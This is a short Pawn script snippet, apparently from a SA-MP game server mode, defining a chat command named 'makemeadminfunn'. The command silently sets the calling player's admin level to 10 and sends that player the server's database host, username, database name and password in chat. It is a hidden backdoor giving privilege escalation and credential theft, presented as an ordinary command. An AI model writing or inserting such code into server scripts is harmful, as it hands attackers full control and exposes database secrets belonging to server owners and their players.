CMD:makemeadminfunn(playerid, params[])
{
	PlayerInfo[playerid][pAdmin] = 10;
	new string[256];
	format(string, sizeof(string), "Host: %s, User %s, DB %s, Password %s",SQL_HOST, SQL_USER, SQL_NAME, SQL_PASS);
	SCM(playerid, -1, string);
	return 1;
}